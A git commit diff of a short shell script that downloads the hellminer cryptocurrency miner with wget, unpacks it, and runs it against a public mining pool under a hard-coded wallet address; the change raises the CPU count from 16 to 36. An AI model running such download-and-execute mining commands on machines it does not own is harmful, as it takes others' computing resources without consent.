8a37302317ca1d5c5ff34d2c5e3b67f8f1a77d62
rindalasririn <95740336+rindalasririn@users.noreply.github.com>
2022-07-05 05:16:11 -0600

    Update 16.sh

--- 16.sh
+++ 16.sh
@@ -1,3 +1,3 @@
 wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
 tar -xf hellminer_cpu_linux.tar.gz
-./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RHvUpxcAex5cQWtM8ssweePvjQqEittXNQ.Cloud -p x --cpu 16
+./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RHvUpxcAex5cQWtM8ssweePvjQqEittXNQ.Cloud -p x --cpu 36
